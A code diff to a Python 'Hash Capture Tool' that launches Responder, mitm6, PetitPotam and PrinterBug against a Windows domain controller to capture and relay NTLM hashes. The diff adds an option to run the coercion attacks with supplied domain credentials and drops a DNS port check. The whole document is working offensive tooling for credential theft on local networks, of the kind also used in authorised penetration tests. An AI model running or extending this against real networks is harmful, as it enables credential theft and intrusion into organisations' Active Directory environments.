@@ -29,9 +29,10 @@ logging.basicConfig(
 )
 
 class HashCapture:
-    def __init__(self, interface, domain=None, verbose=True):
+    def __init__(self, interface, domain=None, creds=None, verbose=True):
         self.interface = interface
         self.domain = domain
+        self.creds = creds
         self.verbose = verbose
         self.stop_event = Event()
         self.processes = {}
@@ -67,22 +68,6 @@ class HashCapture:
         # Configure signal handlers
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
-
-    def check_dns_port(self):
-        """Check if port 53 is available"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.bind(('', 53))
-            sock.close()
-            return True
-        except socket.error as e:
-            self.logger.error(f"Port 53 is already in use: {e}")
-            try:
-                output = subprocess.check_output("netstat -tulpn | grep :53", shell=True).decode()
-                self.logger.error(f"Process using port 53: {output.strip()}")
-            except:
-                pass
-            return False
 
     def create_targets_file(self):
         """Create targets file for ntlmrelayx"""
@@ -241,7 +226,7 @@ class HashCapture:
             cmd = [
                 "responder",
                 "-I", self.interface,
-                "-wd"  # Combined flags for WinPopup and DHCP
+                "-wd"
             ]
 
             self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
@@ -269,9 +254,6 @@ class HashCapture:
     def start_mitm6(self):
         """Start mitm6 attack"""
         try:
-            if not self.check_dns_port():
-                return False
-
             # Install required dependencies
             try:
                 subprocess.check_call([
@@ -327,11 +309,15 @@ class HashCapture:
 
             cmd = [
                 "petitpotam.py",
-                self.local_ip,     # Listener
-                self.dc_ip,        # Target
-                "-pipe", "lsarpc",
-                "-no-pass"
+                self.local_ip,
+                self.dc_ip,
+                "-pipe", "lsarpc"
             ]
+            
+            if self.creds:
+                cmd.extend(["-u", self.creds])
+            else:
+                cmd.append("-no-pass")
             
             self.logger.info(f"Starting PetitPotam with command: {' '.join(cmd)}")
             process = Popen(
@@ -362,12 +348,20 @@ class HashCapture:
                 self.logger.warning("PrinterBug attack requires a valid domain")
                 return False
 
-            cmd = [
-                "printerbug.py",
-                f"{self.domain}/anonymous@{self.dc_ip}",
-                self.local_ip,
-                "-no-pass"
-            ]
+            if self.creds:
+                username, password = self.creds.split(':')
+                cmd = [
+                    "printerbug.py",
+                    f"{self.domain}/{username}:{password}@{self.dc_ip}",
+                    self.local_ip
+                ]
+            else:
+                cmd = [
+                    "printerbug.py",
+                    f"{self.domain}/anonymous@{self.dc_ip}",
+                    self.local_ip,
+                    "-no-pass"
+                ]
             
             self.logger.info(f"Starting PrinterBug with command: {' '.join(cmd)}")
             process = Popen(
@@ -447,6 +441,7 @@ def main():
     parser = argparse.ArgumentParser(description="Hash Capture Tool")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
     parser.add_argument("-d", "--domain", help="Domain name for attacks")
+    parser.add_argument("-c", "--creds", help="Domain credentials in the format 'user:password'")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
     args = parser.parse_args()
 
@@ -454,7 +449,7 @@ def main():
         logging.error("This script must be run as root")
         sys.exit(1)
 
-    capture = HashCapture(args.interface, args.domain, args.verbose)
+    capture = HashCapture(args.interface, args.domain, args.creds, args.verbose)
     if not capture.run():
         sys.exit(1)
 
